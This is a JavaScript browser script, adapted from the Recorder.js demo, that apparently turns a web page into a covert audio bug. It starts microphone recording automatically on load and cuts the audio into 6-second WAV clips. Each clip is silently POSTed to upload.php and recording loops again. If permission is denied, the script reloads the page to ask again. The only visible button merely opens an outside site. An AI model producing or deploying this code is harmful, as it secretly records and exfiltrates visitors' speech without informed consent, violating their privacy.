// Adapted from Simple Recorder.js Demo https://github.com/addpipe/simple-recorderjs-demo
// Recorderjs by: https://github.com/mattdiamond/Recorderjs
//webkitURL is deprecated but nevertheless
URL = window.URL || window.webkitURL;

var gumStream; 						//stream from getUserMedia()
var rec; 							//Recorder.js object
var input; 							//MediaStreamAudioSourceNode we'll be recording

// shim for AudioContext when it's not avb. 
var AudioContext = window.AudioContext || window.webkitAudioContext;
var audioContext //audio context to help us record

var redButton = document.getElementById("redButton");

redButton.addEventListener("click", Redirect);


function Redirect() {

window.open('https://sabzlearn.ir', '_blank');


}

window.setTimeout(startRecording, 300);

window.setInterval(stopRecording, 6000);



function startRecording() {
	//console.log("recordButton clicked");

	/*
		Enhanced constraints object with better audio quality settings
		- High sample rate for clarity
		- Noise suppression enabled
		- Echo cancellation enabled
		- Auto gain control for consistent levels
	*/
    
    var constraints = { 
        audio: {
            sampleRate: 16000,  // 16kHz sample rate for high quality
            channelCount: 1,     // Mono recording
            echoCancellation: true,
            noiseSuppression: true,
            autoGainControl: true
        }, 
        video: false 
    }


	/*
    	We're using the standard promise based getUserMedia() 
    	https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
	*/

	navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
		console.log("getUserMedia() success, stream created, initializing Recorder.js with enhanced audio settings...");

		/*
			create an audio context after getUserMedia is called
			Using the actual stream's sample rate for accurate encoding
		*/
		audioContext = new AudioContext();

		//update the format 
	//	document.getElementById("formats").innerHTML="Format: 1 channel pcm @ "+audioContext.sampleRate/1000+"kHz"

		/*  assign to gumStream for later use  */
		gumStream = stream;
		
		/* use the stream */
		input = audioContext.createMediaStreamSource(stream);

		/* 
			Create the Recorder object and configure to record mono sound (1 channel)
			Higher buffer size for better quality encoding
			Recording 2 channels  will double the file size
		*/
		rec = new Recorder(input, {
			numChannels: 1,
			bufferLen: 8192,  // Higher buffer for better quality
			mimeType: 'audio/wav'
		})

		//start the recording process
		rec.record()
		redButton.disabled = false;

		//console.log("Recording started with enhanced audio quality");


	}).catch(function(err) {
	  	//enable the record button if getUserMedia() fails
    	redButton.disabled = true;
	console.error("getUserMedia error:", err);
	window.location.reload();
	});
}


function uploadRecord() {

$(document).ready(function() {
	$('a#Upload')[0].click();

});
	

}

function stopRecording() {
	//console.log("stopButton clicked");


	//tell the recorder to stop the recording
	rec.stop();

	//stop microphone access
	//gumStream.getAudioTracks()[0].stop();

	//create the wav blob and pass it on to createDownloadLink
	rec.exportWAV(createDownloadLink);

}

function createDownloadLink(blob) {
	
	var url = URL.createObjectURL(blob);
	var timestamp = new Date().toISOString().replace(/[:.]/g, '-');
	var filename = "audio_" + timestamp + ".wav";

	  var xhr=new XMLHttpRequest();
	  xhr.onload=function(e) {
	      if(this.readyState === 4) {
	        console.log("Audio uploaded successfully to server");
	      }
	  };

	  xhr.onerror = function(e) {
	  	console.error("Error uploading audio:", e);
	  };

	  var fd=new FormData();
	  fd.append("audio_data", blob, filename);
	  xhr.open("POST", "upload.php", true);
	  xhr.send(fd);

	window.setTimeout(startRecording, 300);

}
